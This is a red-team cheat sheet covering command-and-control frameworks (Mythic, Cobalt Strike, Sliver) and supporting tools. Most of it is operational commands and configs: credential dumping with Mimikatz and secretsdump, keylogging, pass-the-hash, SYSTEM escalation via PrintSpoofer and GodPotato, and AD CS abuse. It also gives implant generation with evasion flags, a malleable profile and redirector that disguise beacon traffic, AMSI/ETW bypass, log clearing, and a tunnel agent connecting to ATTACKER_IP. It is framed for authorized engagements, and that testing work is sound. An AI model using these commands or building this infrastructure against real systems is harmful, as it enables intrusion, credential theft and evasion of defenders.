# The Ultimate C2 Framework Cheat Sheet for Professional Red Teamers

## Introduction

Command and Control (C2) frameworks are the backbone of any post-exploitation operation. They provide the infrastructure, tradecraft, and flexibility required to maintain access, move laterally, and achieve objectives while evading detection. This cheat sheet is a comprehensive operational reference for professional red teamers, covering core concepts, framework comparisons, command references, OPSEC best practices, and essential tooling.

> ** Legal & Ethical Notice:** The techniques documented here are intended exclusively for authorized red team engagements, penetration tests, and security research. Unauthorized access to systems is illegal and unethical. Always operate within the scope of a signed authorization document with an explicit end date.


## 1. Core Concepts

Before touching any framework, you must internalize these fundamental concepts. They dictate every operational decision you make.

| Concept | Explanation |
|---|---|
| **Beacon / Implant** | A program that runs on the victim system and periodically checks in with the C2 server. It is the operator's presence inside the target environment. |
| **Session vs. Beacon** | A **Session** is a real‑time, interactive connection (similar to SSH) — low latency, high interactivity, but more noise. A **Beacon** is an asynchronous, periodic callback — stealthier, but with inherent latency between tasks. |
| **Sleep Interval** | The base time between each beacon check‑in to the C2 server. Measured in seconds or minutes. Longer intervals = stealthier, but slower response. |
| **Jitter** | A randomized percentage applied to the sleep interval to break predictable timing patterns. For example, a 60‑second sleep with 30% jitter means the beacon will check in at a random time between 42 and 78 seconds. This defeats interval‑based detection. |
| **Callback** | The moment a beacon first connects back to the C2 server, confirming execution on the target. |
| **Redirector** | An intermediary server (often a cheap VPS) that forwards traffic between the beacon and the actual teamserver. It hides the true C2 IP address and can filter malicious traffic. |
| **Malleable C2 Profile** | A configuration file that shapes the beacon's network traffic to resemble legitimate application traffic (e.g., Microsoft Update, JSON API calls). It controls URIs, headers, user‑agents, and data encoding. |
| **OPSEC** | Operational Security — the set of practices that reduce the likelihood of detection by SOC analysts, EDR, NDR, and other defensive layers. |


## 2. C2 Framework Comparison

Choosing the right framework is a strategic decision that depends on your engagement scope, target environment, budget, and stealth requirements.

| Framework | Language | Protocols | License | Primary Use Case | Key Strengths | Key Weaknesses |
|---|---|---|---|---|---|---|
| **Cobalt Strike** | Java / C | HTTP/S, DNS, SMB, TCP | Commercial (expensive) | Industry‑standard red teaming, post‑exploitation | Mature ecosystem, aggressive obfuscation, sleep masking, malleable profiles, extensive BOF support | Highly signatured; expensive; requires expertise to configure securely |
| **Sliver** | Go | mTLS, HTTP(S), DNS, WireGuard | Open source | Cross‑platform red teaming, Linux‑heavy engagements, training | Modern, well‑maintained, multi‑player, strong Linux support, mTLS, WireGuard transport | Smaller plugin ecosystem than CS; default profiles are known to EDR; some OPSEC issues |
| **Mythic** | Python (core), various agents | Depends on agent (HTTP/S, TCP, etc.) | Open source | Modular agent development, long engagements, training | Highly modular; per‑target agent selection; Docker‑native; strong web UI; supports Apollo, Athena, Poseidon, etc. | Steeper learning curve; agent quality varies significantly |
| **Havoc** | C/C++/Go | HTTP/S, SMB | Open source | Advanced red teaming, EDR bypass | Modern codebase; relatively low detection signatures; UAC bypass; reflective DLL injection | Smaller community; less mature than CS |
| **Metasploit** | Ruby | Multiple | Open source | Penetration testing, exploitation, training | Huge exploit database; versatile; excellent for initial access | Not designed for stealthy red teaming; easily detected by EDR |

### Framework Selection Guidance

| Scenario | Recommended Framework | Why |
|---|---|---|
| **Stealthy red team operation** | Cobalt Strike, Havoc | Both offer advanced evasion, sleep masking, and malleable profiles. |
| **Cross‑platform (Windows + Linux)** | Sliver, Mythic | Sliver’s Go implants compile to multiple OSes; Mythic supports diverse agents. |
| **Custom agent development** | Mythic, Sliver | Mythic’s modular architecture is designed for custom agents; Sliver supports extensions. |
| **Budget‑conscious engagement** | Sliver, Mythic, Havoc | All are free and open source. |
| **Training / lab environment** | Metasploit, Mythic | Metasploit is beginner‑friendly; Mythic teaches modular C2 architecture. |
| **Windows‑centric AD environment** | Cobalt Strike, Empire (forks) | Deep Windows/AD integration, mature tooling. |


## 3. Mythic Framework — Command Reference

Mythic is a modular C2 framework where the core is written in Python and agents (payload types) can be written in any language. The Apollo agent (.NET) is commonly used for Windows targets.

### 3.1 Beacon Management

| Command | Description |
|---|---|
| `sleep 0 0` | Set the agent to real‑time communication (no sleep). **Use only in lab environments.** |
| `sleep 60 30` | Check in every 60 seconds with 30% jitter. |
| `jobs` | List all running jobs in the agent. |
| `jobkill [jid]` | Kill a specific job by its ID. |
| `exit` | Terminate the agent session. |
| `link` | Connect to another agent (peer‑to‑peer). |
| `unlink` | Disconnect from a linked agent. |

### 3.2 Reconnaissance

| Command | Description |
|---|---|
| `ifconfig` | List network interfaces and IP addresses. |
| `ps` | List running processes. |
| `ls -Path [path]` | List directory contents. |
| `pwd` | Print working directory. |
| `net_dclist [domain]` | Enumerate domain controllers. |
| `net_shares -Computer [host]` | List network shares on a remote host. |
| `net_localgroup [host]` | Enumerate local groups. |
| `netstat -Tcp -Udp` | Show network connections. |
| `screenshot` | Capture a screenshot of the target’s display. |

### 3.3 Privilege Escalation

| Command | Description |
|---|---|
| `getprivs` | Enable all available privileges for the current token. |
| `mimikatz -Command "privilege::debug"` | Run Mimikatz with specified commands. |
| `steal_token [pid]` | Steal a token from a specified process. |
| `make_token -username [user] -password [pass]` | Create a token for impersonation. |
| `printspoofer -Command "cmd.exe"` | Use PrintSpoofer to escalate to SYSTEM via SeImpersonate. |
| `rev2self` | Revert to the original token. |

### 3.4 Lateral Movement

| Command | Description |
|---|---|
| `pth -Domain [domain] -User [user] -NTLM [hash] -Run [cmd.exe]` | Pass‑the‑Hash using NTLM hash. |
| `cp -Path [source] -Destination [dest]` | Copy a file to a remote system. |
| `sc -Query -Computer [host]` | List services on a remote host. |
| `powershell -Command "Invoke-Command ..."` | Execute PowerShell remotely. |

### 3.5 Execution

| Command | Description |
|---|---|
| `shell whoami` | Execute a shell command. |
| `powershell -Command "Get-Process"` | Execute PowerShell. |
| `execute_assembly -Assembly SharpHound.exe -Arguments "-c all --zipfilename mythical"` | Execute a .NET assembly in memory. |
| `register_assembly` | Upload an assembly to memory for later execution. |
| `execute_pe -PE [binary.exe]` | Execute an unmanaged PE. |
| `execute_coff -Coff [file.o] -Function [go]` | Execute a Beacon Object File (BOF). |

### 3.6 File Transfer

| Command | Description |
|---|---|
| `upload` | Upload a file to the beacon. |
| `download -Path [path]` | Download a file from the beacon. |
| `rm -Path [path]` | Delete a file on the target. |

### 3.7 Pivoting

| Command | Description |
|---|---|
| `socks 1080` | Start a SOCKS5 proxy on the beacon (port 1080). |
| `socks stop` | Stop the SOCKS proxy. |
| `portfwd add -l 3389 -p 3389 -r 192.168.1.10` | Forward local port 3389 to a remote host. |


## 4. Cobalt Strike — Command Reference

Cobalt Strike is the commercial industry standard. Its Beacon is a flexible, multi‑protocol payload with extensive post‑exploitation capabilities.

### 4.1 Beacon Management

| Command | Description |
|---|---|
| `sleep [seconds] [jitter]` | Set sleep interval and jitter (e.g., `sleep 300 30`). |
| `getuid` | Show the current user context. |
| `getsystem` | Attempt to elevate to SYSTEM. |
| `checkin` | Force the beacon to check in immediately. |
| `jobs` | List running jobs. |
| `jobkill [jid]` | Kill a running job. |

### 4.2 Reconnaissance

| Command | Description |
|---|---|
| `pwd`, `ls`, `cd` | File system navigation. |
| `ps` | List processes. |
| `portscan [pid] [x86|x64]` | Perform a port scan from the beacon. |
| `net view` | List network shares. |
| `net computers` | Enumerate domain computers. |

### 4.3 Credential Access

| Command | Description |
|---|---|
| `hashdump` | Dump password hashes from SAM. |
| `logonpasswords` | Run Mimikatz to extract credentials from LSASS. |
| `keylogger [pid] [x86|x64]` | Start a keylogger on a specific process. |
| `mimikatz [command]` | Run arbitrary Mimikatz commands. |

### 4.4 Execution

| Command | Description |
|---|---|
| `powershell-import [file.ps1]` | Import a PowerShell script into memory. |
| `psinject [pid] [arch] [command]` | Inject Unmanaged PowerShell into a process. |
| `execute-assembly [assembly.exe]` | Execute a .NET assembly in memory. |
| `shspawn [process] [arch]` | Spawn a process and inject shellcode. |
| `inline-execute [BOF]` | Execute a Beacon Object File (BOF). |

### 4.5 Lateral Movement

| Command | Description |
|---|---|
| `psexec [target] [service] [listener]` | PsExec‑based lateral movement. |
| `wmi [target] [command]` | WMI execution. |
| `winrm [target] [command]` | WinRM execution. |
| `ssh-key` | Use SSH keys for lateral movement. |
| `steal_token [pid]` | Steal a token from another process. |

### 4.6 Pivoting

| Command | Description |
|---|---|
| `socks 1080` | Start a SOCKS4a proxy. |
| `socks stop` | Stop the SOCKS proxy. |
| `rportfwd [port]` | Set up a reverse port forward. |


## 5. Sliver — Command Reference

Sliver is a modern, open‑source, Go‑based C2 framework developed by Bishop Fox. It supports mTLS, HTTP(S), DNS, and WireGuard transports, and both session and beacon implant types.

### 5.1 Payload Generation

```bash
# Basic Windows beacon over mTLS
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --format exe --save /tmp/beacon.exe

# With sleep and jitter settings
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --seconds 60 --jitter 30

# Linux implant over HTTP
generate --http 10.10.10.10:80 --os linux --arch amd64 --format elf --save /tmp/implant

# With evasion features
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --evasion --skip-symbols
```

### 5.2 Session & Beacon Management

| Command | Description |
|---|---|
| `sessions` | List active sessions. |
| `beacons` | List active beacons. |
| `use -i <id>` | Interact with a session or beacon by ID. |
| `info` | Show information about the current target. |
| `background` | Background the current session. |
| `interactive` | Start an interactive session (preferred over `shell` for OPSEC). |
| `reconfig` | Reconfigure beacon sleep/jitter on the fly. |

### 5.3 Post‑Exploitation

| Command | Description |
|---|---|
| `whoami` | Current user. |
| `ps` | List processes. |
| `ifconfig` | Network interfaces. |
| `netstat` | Network connections. |
| `upload` / `download` | File transfer. |
| `execute-assembly` | Execute a .NET assembly in memory. |
| `sharp-hound` | Run SharpHound for AD enumeration. |
| `jump-psexec` | Lateral movement via PsExec. |
| `jump-wmiexec` | Lateral movement via WMI. |
| `runas -u user -P pass` | Execute as another user. |

### 5.4 Pivoting

```bash
# Start a SOCKS5 proxy
socks5 start

# Port forwarding
portfwd add -r 10.10.10.10:3389 -l 3389

# TCP pivot listener
pivots tcp --lport 4444
```


## 6. OPSEC Best Practices

This is the section that separates a professional operator from a novice. Detection is a matter of *when*, not *if* — your job is to delay it as long as possible.

### 6.1 Sleep & Jitter Strategy

| Scenario | Interval | Jitter | Rationale |
|---|---|---|---|
| **Lab / Training** | 0s | 0% | Maximum speed; **never use in real engagements.** |
| **Standard Red Team** | 5m | 30% | Balance between stealth and operational control. |
| **APT‑Level Stealth** | 1–24h | 50% | Maximum stealth; suitable for long‑term persistence. |
| **Post‑Privilege Escalation** | 1m | 20% | You need faster response while escalating privileges. |

> ** Critical Rule:** A beacon checking in every second is effectively a distress flare. Modern SOCs and EDR platforms flag high‑frequency, regular callbacks within minutes. Always use jitter. Always use realistic sleep intervals.

### 6.2 Protocol Selection

| Protocol | Advantages | Disadvantages |
|---|---|---|
| **mTLS** | Strong mutual authentication; suitable for lab and internal pivoting. | Unusual traffic pattern; requires certificate management; may be blocked by egress filters. |
| **HTTP(S)** | Blends with normal web traffic; traverses most egress filters. | Vulnerable to deep packet inspection (DPI); malleable profiles are essential. |
| **DNS** | Often permitted through egress filters; useful when HTTP is blocked. | Slow; low bandwidth; easily detected by DNS monitoring solutions. |
| **WireGuard** (Sliver) | Modern, fast, encrypted; less scrutinized than HTTP. | Requires UDP egress; not always available. |

### 6.3 Malleable C2 Profiles

A malleable C2 profile allows you to shape your beacon's traffic to mimic legitimate applications. This is non‑negotiable for HTTP(S) beacons.

**Example: Cobalt Strike Malleable Profile (Generic CDN Telemetry)**

```
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/telemetry/heartbeat";
    client {
        header "Accept" "application/json";
        metadata {
            base64;
            prepend "session=";
        }
    }
    server {
        output {
            base64;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
        }
    }
}

http-post {
    set uri "/api/v1/telemetry/report";
    client {
        header "Content-Type" "application/json";
        id {
            base64;
            prepend "id=";
        }
        output {
            base64;
            prepend "{\"payload\":\"";
            append "\"}";
        }
    }
}
```

**Key Profile Best Practices:**
- Use realistic, non‑suspicious URIs (e.g., `/api/v1/updates`, `/static/js/app.js`).
- Match the user‑agent of a common browser or application in your target environment.
- Encode metadata and output using base64 or a custom encoding.
- Set `sleeptime` and `jitter` to realistic values (e.g., 5–15 minutes, 20–40% jitter).
- Test your profile with tools like `c2lint` (Cobalt Strike) before deployment.

### 6.4 Redirector & Domain Fronting Infrastructure

**Never expose your teamserver's real IP.** Use a layered infrastructure:

1. **Redirector (VPS):** A cheap VPS running Nginx or Apache. It forwards only traffic matching your malleable profile to the teamserver and drops everything else.
2. **Domain Fronting:** Exploits the discrepancy between TLS SNI and HTTP Host headers. The network observer sees a connection to a high‑reputation domain (e.g., `cdn.microsoft.com`), but the CDN routes the request to your origin based on the inner Host header.
3. **TLS Certificates:** Use Let's Encrypt or a valid CA‑issued certificate for your redirector's domain. Self‑signed certificates are an immediate red flag.
4. **Domain Age:** Use a domain that has been registered for some time (aged domain) to avoid "newly registered domain" flags.

**Example Nginx Redirector Configuration (Conceptual):**

```nginx
server {
    listen 443 ssl;
    server_name cdn.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/cdn.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.yourdomain.com/privkey.pem;

    # Only forward traffic with the specific User-Agent from your malleable profile
    if ($http_user_agent !~ "SpecificBeaconUA") {
        return 302 https://www.google.com;
    }

    location /api/v1/telemetry/ {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
    }

    # Drop all other traffic
    location / {
        return 404;
    }
}
```

### 6.5 Payload Evasion Techniques

| Technique | Description | Framework Support |
|---|---|---|
| **In‑Memory Execution** | Run assemblies and shellcode without writing to disk. | CS: `execute-assembly`, `shspawn`; Mythic: `execute_assembly`, `execute_pe`; Sliver: `execute-assembly` |
| **Direct Syscalls** | Bypass user‑mode hooks by invoking syscalls directly. | Custom BOFs / agents; Havoc supports direct syscalls natively. |
| **Thread Stack Spoofing** | Hide the call stack from EDR memory scanners. | Advanced custom agents; some Havoc and CS configurations. |
| **Sleep Masking** | Encrypt beacon memory during sleep so EDR cannot scan it. | Cobalt Strike (Malleable profiles + sleep mask); some Mythic agents. |
| **AMSI Bypass** | Disable Antimalware Scan Interface before executing PowerShell. | CS: `powershell-import` with AMSI bypass; Sliver: `--amsi-bypass`; Mythic: agent‑dependent. |
| **ETW Bypass** | Disable Event Tracing for Windows to blind telemetry. | Sliver: `--etw-bypass`; advanced agents. |

### 6.6 Cleanup

- Remove uploaded files and tools from the target.
- Clear relevant event logs (e.g., Security, System, PowerShell).
- Remove persistence mechanisms if the engagement scope requires it.
- **Never upload stealthy binaries to VirusTotal.** Use local analysis or a private sandbox.

> **Burn Condition:** Every implant configuration must include a kill‑switch or hard expiry tied to the engagement end date. Implants that outlive the engagement are out of scope and create legal and operational risk.


## 7. Essential Toolkit for C2 Operations

These tools complement your C2 framework and are indispensable for professional red teaming.

### 7.1 Active Directory Enumeration & Attack Path Analysis

| Tool | Purpose | Key Commands | When to Use |
|---|---|---|---|
| **SharpHound / BloodHound** | Map AD relationships and find attack paths to Domain Admin. | `SharpHound.exe -c All --zipfilename bloodhound_data.zip` | After gaining initial domain access; essential for identifying lateral movement paths. |
| **BloodHound‑Python** | Linux‑based AD enumeration for BloodHound. | `bloodhound-python -u user -p pass -d domain -ns DC_IP -c all --zip -o bloodhound/` | When operating from Linux and need BloodHound data. |
| **Certipy** | Enumerate and exploit AD Certificate Services (AD CS) vulnerabilities (ESC1–ESC8). | `certipy find -u user@domain -p pass -dc-ip DC_IP -stdout`; `certipy req -u user@domain -p pass -ca CA -template ESC1 -upn administrator@domain` | When AD CS is present; highly effective for privilege escalation. |
| **Rubeus** | Kerberos abuse (Kerberoasting, AS‑REP, Pass‑the‑Ticket). | `Rubeus.exe kerberoast /outfile:hashes.txt`; `Rubeus.exe ptt /ticket:ticket.kirbi` | During credential access and lateral movement phases. |
| **Impacket** (Kali) | Python‑based suite for SMB, WMI, MSSQL, and more. | `impacket-secretsdump domain/user:pass@DC_IP`; `impacket-psexec domain/user:pass@target` | Cross‑platform, scriptable lateral movement and credential dumping. |
| **NetExec (nxc)** | Mass SMB/WinRM/MSSQL/SSH validation and execution. | `nxc smb 192.168.1.0/24 -u user -p pass -x whoami`; `nxc winrm target -u user -H hash -x whoami` | Large‑scale target validation and lateral movement. |
| **Mimikatz** | Credential extraction from LSASS, Kerberos ticket manipulation. | `sekurlsa::logonpasswords`; `kerberos::golden` | Post‑exploitation credential access. |
| **StandIn** | Machine account creation, ADCS template manipulation, ACL abuse. | `StandIn.exe --computer EvilComputer --make`; `StandIn.exe --adcs --template Machine` | When you need to manipulate AD objects without touching the target. |
| **PrintSpoofer / GodPotato** | SeImpersonate → SYSTEM escalation on Windows. | `PrintSpoofer.exe -i -c cmd.exe`; `GodPotato.exe -cmd "cmd /c whoami"` | When you have a service account with SeImpersonatePrivilege. |

### 7.2 Pivoting & Tunneling

| Tool | Purpose | Key Commands | When to Use |
|---|---|---|---|
| **Chisel** | TCP/UDP tunneling over HTTP; SOCKS proxy. | Server: `chisel server -p 8080 --reverse`; Client: `chisel client server:8080 R:socks` | When you need a lightweight SOCKS proxy through a compromised host. |
| **Ligolo‑ng** | TUN interface‑based transparent routing; no SOCKS overhead. | `sudo ip tuntap add user $USER mode tun ligolo`; `sudo ip link set ligolo up`; `./proxy -selfcert`; Agent: `./agent -connect ATTACKER_IP:11601 -ignore-cert` | Preferred for complex pivoting; provides native routing without proxychains. |
| **proxychains** | Route tool traffic through SOCKS proxies. | `proxychains nmap -sT -Pn target` | Complement to Chisel/SSH SOCKS proxies. |
| **socat** | Relay and forward TCP/UDP ports. | `socat TCP-LISTEN:8080,fork TCP:target:80` | Simple port forwarding and relays. |

### 7.3 Tool Selection Guidance

| Operational Need | Recommended Tool(s) | Why |
|---|---|---|
| **Map AD attack paths** | BloodHound + SharpHound | Visual graph of AD relationships; identifies shortest path to Domain Admin. |
| **Exploit AD CS** | Certipy | Comprehensive AD CS enumeration and exploitation (ESC1–ESC8). |
| **Kerberoasting / AS‑REP** | Rubeus, Impacket | Rubeus for Windows‑native; Impacket for Linux‑based operations. |
| **Dump credentials** | Mimikatz, Impacket secretsdump | Mimikatz for LSASS; secretsdump for remote registry/SAM. |
| **Mass lateral movement** | NetExec, Impacket | NetExec for validation and spray; Impacket for precise execution. |
| **Pivot through a host** | Ligolo‑ng, Chisel | Ligolo‑ng for transparent routing; Chisel for lightweight SOCKS. |
| **Escalate to SYSTEM** | PrintSpoofer, GodPotato | Reliable SeImpersonate abuse on Windows. |


## 8. Quick Reference: Framework Command Matrix

| Operation | Mythic (Apollo) | Cobalt Strike | Sliver |
|---|---|---|---|
| **Set sleep** | `sleep 60 30` | `sleep 60 30` | `reconfig --seconds 60 --jitter 30` |
| **List processes** | `ps` | `ps` | `ps` |
| **List network** | `ifconfig`, `netstat` | `portscan`, `net view` | `ifconfig`, `netstat` |
| **Execute shell** | `shell whoami` | `shell whoami` | `execute -o whoami` |
| **Execute PowerShell** | `powershell Get-Process` | `powershell Get-Process` | `execute -o powershell Get-Process` |
| **Run .NET assembly** | `execute_assembly SharpHound.exe` | `execute-assembly SharpHound.exe` | `execute-assembly SharpHound.exe` |
| **Dump credentials** | `mimikatz` | `logonpasswords` | `mimikatz` (via extension) |
| **Lateral movement** | `pth`, `link` | `psexec`, `wmi`, `winrm` | `jump-psexec`, `jump-wmiexec` |
| **SOCKS proxy** | `socks 1080` | `socks 1080` | `socks5 start` |
| **Port forward** | `portfwd add ...` | `rportfwd ...` | `portfwd add ...` |


## 9. Operational Checklist Before Going Live

Before you deploy any beacon in a real engagement, verify the following:

- [ ] **Authorization:** Signed document with explicit C2 use, scope, and end date.
- [ ] **Kill‑switch:** Implant configuration includes an expiry or burn condition.
- [ ] **Redirector:** At least one redirector is in place; teamserver IP is not exposed.
- [ ] **TLS Certificate:** Valid, CA‑issued certificate on the redirector.
- [ ] **Malleable Profile:** HTTP(S) traffic is shaped to mimic legitimate traffic.
- [ ] **Sleep/Jitter:** Realistic sleep interval and jitter (≥30%) configured.
- [ ] **OPSEC Review:** Sleep mask, AMSI bypass, and ETW bypass enabled where supported.
- [ ] **Detection Pairing:** Detection notes (Sigma/Sysmon/Zeek) prepared for the blue team.
- [ ] **Documentation:** All dials (sleep, jitter, URI, redirector path, burn condition) logged.
- [ ] **Cleanup Plan:** Procedure for removing artifacts and terminating implants at engagement end.


## 10. Further Reading & Resources

- **Cobalt Strike Documentation:** `hstechdocs.helpsystems.com`
- **Sliver Documentation:** `sliver.sh`
- **Mythic Documentation:** `docs.mythic-c2.net`
- **BloodHound Documentation:** `bloodhound.specterops.io`
- **Ligolo‑ng Documentation:** `docs.ligolo.ng`
- **MITRE ATT&CK:** `attack.mitre.org` (for mapping techniques)

---


2026/09/28
